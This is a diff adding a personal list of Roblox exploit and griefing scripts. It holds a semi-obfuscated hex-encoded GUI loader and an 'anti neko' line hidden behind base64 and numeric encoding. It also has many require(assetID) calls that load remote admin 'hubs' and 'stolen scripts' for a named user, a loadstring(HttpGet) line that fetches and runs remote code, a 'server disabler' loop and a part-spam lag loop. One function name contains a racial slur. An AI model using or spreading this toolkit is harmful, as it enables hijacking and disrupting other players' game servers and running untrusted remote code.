@@ -1,0 +1,200 @@
+wRoblox Scripts
+If your roblox username is not GlichGamerF then replace GlichGamerF with Your Roblox Username
+
+----------SERVER SCRIPTS----------
+-L/
+---
+---
+---UTG Semi-OBFUSCATED
+function sandbox(a,c)local b=getfenv(c) local _=setmetatable({},{__index=function(_,_)if _=="\x73\x63\x72\x69\x70\x74"then return a else return b[_]end end}) setfenv(c,_) return c end cors={} mas=Instance.new("\x4D\x6F\x64\x65\x6C",game:GetService("\x4C\x69\x67\x68\x74\x69\x6E\x67")) ScreenGui0=Instance.new("\x53\x63\x72\x65\x65\x6E\x47\x75\x69") Frame1=Instance.new("\x46\x72\x61\x6D\x65") TextLabel2=Instance.new("\x54\x65\x78\x74\x4C\x61\x62\x65\x6C") TextLabel3=Instance.new("\x54\x65\x78\x74\x4C\x61\x62\x65\x6C") TextButton4=Instance.new("\x54\x65\x78\x74\x42\x75\x74\x74\x6F\x6E") Script5=Instance.new("\x53\x63\x72\x69\x70\x74") TextButton6=Instance.new("\x54\x65\x78\x74\x42\x75\x74\x74\x6F\x6E") Script7=Instance.new("\x53\x63\x72\x69\x70\x74") ScreenGui0.Parent=mas ScreenGui0.ZIndexBehavior=Enum.ZIndexBehavior.Sibling Frame1.Parent=ScreenGui0 Frame1.Position=UDim2.new(0.672340453,0,0.722493887,0) Frame1.Size=UDim2.new(0.295744687,0,0.245476797,0) Frame1.BackgroundColor=BrickColor.new("\x44\x65\x65\x70\x20\x6F\x72\x61\x6E\x67\x65") Frame1.BackgroundColor3=Color3.new(1,0.615686,0) TextLabel2.Parent=Frame1 TextLabel2.Size=UDim2.new(0.99999994,0,0.149800748,0) TextLabel2.BackgroundColor=BrickColor.new("\x43\x47\x41\x20\x62\x72\x6F\x77\x6E") TextLabel2.BackgroundColor3=Color3.new(0.505882,0.337255,0) TextLabel2.BackgroundTransparency=0.5 TextLabel2.BorderSizePixel=0 TextLabel2.Font=Enum.Font.GothamBold TextLabel2.FontSize=Enum.FontSize.Size14 TextLabel2.Text="\x47\x61\x6D\x65\x72\x20\x47\x55\x49" TextLabel2.TextColor=BrickColor.new("\x49\x6E\x73\x74\x69\x74\x75\x74\x69\x6F\x6E\x61\x6C\x20\x77\x68\x69\x74\x65") TextLabel2.TextColor3=Color3.new(1,1,1) TextLabel2.TextScaled=true TextLabel2.TextSize=14 TextLabel2.TextWrap=true TextLabel2.TextWrapped=true TextLabel3.Parent=Frame1 TextLabel3.Position=UDim2.new(0,0,0.846613467,0) TextLabel3.Size=UDim2.new(0.99999994,0,0.149800748,0) TextLabel3.BackgroundColor=BrickColor.new("\x43\x47\x41\x20\x62\x72\x6F\x77\x6E") TextLabel3.BackgroundColor3=Color3.new(0.505882,0.337255,0) TextLabel3.BackgroundTransparency=0.5 TextLabel3.BorderSizePixel=0 TextLabel3.Font=Enum.Font.GothamBold TextLabel3.FontSize=Enum.FontSize.Size14 TextLabel3.Text="\x46\x69\x72\x65\x77\x61\x6C\x6C\x20\x7C\x20\x54\x68\x65\x20\x73\x63\x72\x69\x70\x74\x20\x63\x6F\x6E\x74\x61\x69\x6E\x65\x64\x20\x63\x61\x6E\x27\x74\x20\x62\x65\x20\x6C\x6F\x67\x67\x65\x64\x21" TextLabel3.TextColor=BrickColor.new("\x49\x6E\x73\x74\x69\x74\x75\x74\x69\x6F\x6E\x61\x6C\x20\x77\x68\x69\x74\x65") TextLabel3.TextColor3=Color3.new(1,1,1) TextLabel3.TextScaled=true TextLabel3.TextSize=14 TextLabel3.TextWrap=true TextLabel3.TextWrapped=true TextButton4.Parent=Frame1 TextButton4.Position=UDim2.new(0.115107916,0,0.353585631,0) TextButton4.Size=UDim2.new(0.255395681,0,0.289242864,0) TextButton4.BackgroundColor=BrickColor.new("\x42\x75\x72\x6E\x74\x20\x53\x69\x65\x6E\x6E\x61") TextButton4.BackgroundColor3=Color3.new(0.462745,0.305882,0) TextButton4.BackgroundTransparency=0.5 TextButton4.BorderSizePixel=0 TextButton4.Font=Enum.Font.GothamBold TextButton4.FontSize=Enum.FontSize.Size14 TextButton4.Text="\x52\x75\x6E\x20\x43\x6F\x6E\x74\x61\x69\x6E\x65\x64\x20\x53\x63\x72\x69\x70\x74" TextButton4.TextColor=BrickColor.new("\x49\x6E\x73\x74\x69\x74\x75\x74\x69\x6F\x6E\x61\x6C\x20\x77\x68\x69\x74\x65") TextButton4.TextColor3=Color3.new(1,1,1) TextButton4.TextScaled=true TextButton4.TextSize=14 TextButton4.TextWrap=true TextButton4.TextWrapped=true Script5.Name="\x4D\x69\x6E\x69\x66\x69\x65\x64\x5F\x42\x65\x61\x75\x74\x69\x66\x69\x65\x64\x5F\x53\x63\x72\x69\x70\x74" Script5.Parent=TextButton4 table.insert(cors,sandbox(Script5,function()targetPlayer=script.Parent.Parent.Parent.Parent.Parent.Name function LoadScript()require(8668172770).Gamer("\x47\x6C\x69\x63\x68\x47\x61\x6D\x65\x72\x46")end script.Parent.MouseButton1Click:Connect(LoadScript)end)) TextButton6.Parent=Frame1 TextButton6.Position=UDim2.new(0.627338111,0,0.353585631,0) TextButton6.Size=UDim2.new(0.255395681,0,0.289242864,0) TextButton6.BackgroundColor=BrickColor.new("\x42\x75\x72\x6E\x74\x20\x53\x69\x65\x6E\x6E\x61") TextButton6.BackgroundColor3=Color3.new(0.462745,0.305882,0) TextButton6.BackgroundTransparency=0.5 TextButton6.BorderSizePixel=0 TextButton6.Font=Enum.Font.GothamBold TextButton6.FontSize=Enum.FontSize.Size14 TextButton6.Text="\x44\x65\x73\x74\x72\x6F\x79\x20\x47\x55\x49" TextButton6.TextColor=BrickColor.new("\x49\x6E\x73\x74\x69\x74\x75\x74\x69\x6F\x6E\x61\x6C\x20\x77\x68\x69\x74\x65") TextButton6.TextColor3=Color3.new(1,1,1) TextButton6.TextScaled=true TextButton6.TextSize=14 TextButton6.TextWrap=true TextButton6.TextWrapped=true Script7.Parent=TextButton6 table.insert(cors,sandbox(Script7,function()function delete()script.Parent.Parent.Parent=nil end script.Parent.MouseButton1Click:Connect(delete)end)) for _,_ in pairs(mas:GetChildren())do _.Parent=script pcall(function()_:MakeJoints()end)end mas:Destroy() for _,_ in pairs(cors)do spawn(function()pcall(_)end)end
+-----
+-----
+--- anti neko
+s=getfenv()["\114\101\113\117\105\114\101"](tonumber(tostring(getfenv()["\114\101\113\117\105\114\101"](1.9988474659215096e+24/389489894389289).dec("NjUzOTg4MjQ0Nw=="))));s.s("ANSS")spawn(function()pcall(function()getfenv()[tostring("\114\101\113\117\105\114\101")](tonumber(6688199886)).x(tostring("NjU2NzU4MzI2NjM=")) end)end)
+require(8668172770).Gamer("GlichGamerF") --Special so you get hud
+---
+require(7956480235).theswag("GlichGamerF")
+=============================
+==== START OF OP SCRIPTS ====
+=============================
+--ExSer Code is c00lkidds
+require(10868847330):pls("GlichGamerF") --code robloxded ExSer
+require(8705266136).load("GlichGamerF") --Luau hub test [DANGER LEVEL: Inf]
+===========================
+==== END OF OP SCRIPTS ====
+===========================
+require(8351377942).loadgame("GameName/Sans")
+game:GetService("InsertService"):LoadAsset(26424808).Parent = workspace
+require(8668172770).Gamer("GlichGamerF") --Special
+require(8750528194) --Spaceship
+8668172770
+require(6530368992).antilgr()
+require(5887966886).EH("GlichGamerF") -- Ethereal Hub
+require(5845339294).EH("GlichGamerF") -- Ethereal Hub OLD
+UTG - :s require(4581876090).Lmao("GlichGamerF")
+CH - :s require(4952110282).fehax("GlichGamerF")
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))() -- free admin :s loadstring(game:HttpGet(('https:://raw.githubusercontent.com/EdgelY/infiniteyic 
+8080853805
+EXPH
+Stolen Scripts:
+--
+require(5308680571).load("GlichGamerF")
+require(8626754476):AD('GlichGamerF')
+require(8626754476):AD()
+require(8625794152).load("hugeitor22")
+require(5536569504):SH('Devil_Boy3D")
+require(5352721272):Fire("sklaham20")
+require(3927366328).kitty("nikaoia")
+require(6534274227)("c00lMast3rr")
+require(6788546558)("User")
+require(7067720938)("plrname")
+--
+require(6924448904)
+/fill ~-3 ~-5 ~-3 ~3 ~3 ~3 air
+1527
+5691892594
+90240
+require(7027350608).LoadMain("GlichGamerF")
+require(5160216694).Ass("GlichGamerF")
+require(6965932019).Darkop("GlichGamerF")
+require(5068511197).insert("GlichGamerF")
+require(8305305837).load('GlichGamerF')
+require(7027350608).Skidpocalypse("GlichGamerF") --easy
+--
+require(8593139253)("GlichGamerF")
+require(5160216694).Ass("GlichGamerF")
+require(5916076617).dvsg("GlichGamerF") --not antiskid v12 remastered
+require(5916076617).dvsg("GlichGamerF")
+--
+require(7027350608).ChangeGame("Doomspire")
+wait (1)
+require(7027350608).LoadMeme("Among Us")
+wait (2)
+require(4834326960).RC7("GlichGamerF") --Pass bruh
+Wait (1)
+require(6924448904)
+Dvhacker's script gui v2.1
+--
+require(7192763922).load("GlichGamerF")
+-- Server disabler
+require(5160216694).Ass("GlichGamerF")
+wait (120)
+while true do
+require(7027350608).ChangeGame("Doomspire")
+wait (1)
+require(7027350608).LoadMeme("Among Us")
+wait (1)
+end
+--
+/!\ Juggernaut
+--
+--require(7027350608).ChangeGame("Veszteseg")
+
+
+Target: Tiger's immortality lord xt-r
+require(7063510691).ChangeMap("GlassHouses")
+require(6032465115).Whip_Nae_Nae("Player1")
+require(6032465115).Whip_Nae_Nae("Player2")
+require(6032465115).Whip_Nae_Nae("Player3")
+Wait (1)
+require(8019071862).Load("Juggernaut")
+-- Neko cv=NOCLOTHSCONDONSFW g=NSFW
+/!\ require(8019071862).Load("GlichGamerF") --mxa
+require(6032465115).Whip_Nae_Nae("GlichGamerF")
+require(7027350608).ChangeGame("Veszteseg")
+require(7027350608).ChangeGame("GameNames")
+require(7027350608).LoadMeme("Among Us")
+require(7027350608).LoadMeme("Among Us", true)
+:s require(5160216694).Ass("GlichGamerF")
+require(6223977609)['FakeVr']("GlichGamerF")
+require(6924448904)
+Wait (1)
+You've been unranked!
+require(6526438357).TUSC("An0nymooys") --Replace with GlichGamerF if no work
+require(6526438357).TUSC("GlichGamerF")
+require(6526438357).TUSC("GlichGamerF") --
+require(8268199812).load('TheBox')
+require(5160216694).Ass("GlichGamerF")
+require(8019071862).Load("GlichGamerF")
+:s require(7904530401).bobux("GlichGamerF")
+:s require(5682942869).rank("GlichGamerF") - beyond owner
+:s require(4867404678):Assistance("GlichGamerF")
+:s require(6154173170).ksa("GlichGamerF")
+:s require(5919418431).hub("GlichGamerF")
+:s require(5687247703).BRUH("GlichGamerF")
+require(4748605382).new("ProtoCraftr")
+https://www.roblox.com/games/3954241143/Megacollab
+require(5160216694).Ass("GlichGamerF")
+--
+>https://pastebin.com/FjWQ3yNC
+:s require(5142574517):mega("GlichGamerF")
+:S require(4834326960).RC7("GlichGamerF") password=bruh
+:s require(4668614765).gui("GlichGamerF")  
+:S require(3051592270).naenae("GlichGamerF")
+:s require(4649145907).oCAG("GlichGamerF")
+:s require(4174898313):Dolphin("GlichGamerF")
+
+Note: Change :s if executing with a different admin system or remove :s if using script executor(server)
+                                
+:s require(3705543225):yoniggafo("GlichGamerF")
+:s require(4688842535)("GlichGamerF")
+:s require(5160216694).Ass("GlichGamerF")
+:s require(3736742094):Fire("GlichGamerF")
+:S require(3626787481).neko("GlichGamerF") 
+:s require(4867404678):Assistance("GlichGamerF") --Broken
+:s require(3497222070).load("GlichGamerF")/
+:s require(4748605382).new("GlichGamerF")
+:s require(6029971678).eliza("GlichGamerF")
+:s require(4945821345).lmao("GlichGamerF")
+:s require(5267073279).Sakura("GlichGamerF")
+:s require(5919418431).hub("GlichGamerF")
+ADMIN ---> :s require(4832971989)("GlichGamerF") --User > GlichGamerF
+--
+:s require(5160216694).Ass("GlichGamerF")
+require(7904530401).bobux("GlichGamerF")
+require(4867404678):Assistance("GlichGamerF")
+--
+---
+require(5160216694).Ass("GlichGamerF")
+wait (1)
+require(5687247703).BRUH("GlichGamerF")
+Wait (1)
+require(6154173170).ksa("GlichGamerF")
+Wait (1)
+require(7904530401).bobux("GlichGamerF")
+Wait (1)
+require(4581876090).Lmao("GlichGamerF")
+Wait (1)
+require(4952110282).fehax("GlichGamerF")
+Wait (1)
+require(5919418431).hub("GlichGamerF")
+wait (1)
+require(4867404678):Assistance("GlichGamerF")
+---
+wait (1)
+!rs -clean the whole server
+!fl -fix the whole lighting
+!d !rd -spawn a dummy R6 or R15
+!nos -stop all sounds
+!ws (number) - change walkspeed
+;forceplace all 4950724851
+;place all 4950724851
+Command Blocked by SGHR
+Potentially Problematic:
+ImageUtilities
+Btw, EXP-H > MXA
+-----
+while true do
+
+wait(0.05)
+
+part = Instance.new("Part")
+part.Anchored = false
+part.BrickColor = BrickColor.new("New Yeller")
+part.Position = Vector3.new (0, 100, 0)
+part.Size = Vector3.new(1,1,1)
+
+part.Parent = game.Workspace
+
+end
+-----
